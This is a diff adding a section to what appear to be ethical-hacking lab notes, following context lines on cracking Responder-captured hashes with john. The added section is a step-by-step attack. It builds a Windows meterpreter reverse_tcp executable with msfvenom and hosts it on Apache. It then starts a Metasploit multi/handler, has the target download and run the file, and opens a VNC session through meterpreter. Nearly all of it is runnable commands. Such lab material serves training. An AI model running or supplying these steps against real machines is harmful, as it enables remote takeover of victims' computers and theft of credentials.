@@ -8,3 +8,40 @@ Switch to Kali Linux > observe the logs. Go to /usr/share/responder/logs/<log-fi
 kali linux > john /usr/share/responder/logs/<log-file> [note the cracked password]
 (If john is not installed then :-  sudo snap install john-the-ripper )
 ----END----
+
+-----------Exploiting Client Side Vulnerabilities and Establishing a VNC session-----------
+[Creates malicious payload]
+Kali Linux > msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=<IP_add_kali_Machine> LPORT=444 -o /root/Desktop/Test.exe 
+
+[Share the file to the target machine]
+Create a directory on html folder:
+mkdir /var/www/html/share/
+
+Change the mode for the share to 755:
+chmod -R 755 /var/www/html/share/
+
+Change the ownership of that folder to www-data:
+chown -R www-data:www-data /var/www/html/share/
+
+Now copy the malicious file to the shared location:
+cp /root/Desktop/Test.exe /var/www/html/share/
+
+Next, start the apache service:
+service apache2 start
+
+Open a new terminal window and type msfconsole to launch Metasploit Framework.
+> msfconsole
+> use multi/handler
+> set payload windows/meterpreter/reverse_tcp
+> set LHOST <kali_ip>
+> set LPORT 444
+> run
+
+~~Switch to Windows Machine
+open firefox http://<kali_ip>/share , download the Test.exe and run
+
+~~Switch back to Kali Machine
+check if there is any session that are opened in the Meterpreter Shell
+meterpreter > sysinfo [should show the target systems information]
+meterpreter > run vnc [kick starts remote session]
+------------ END -------------------------------------------
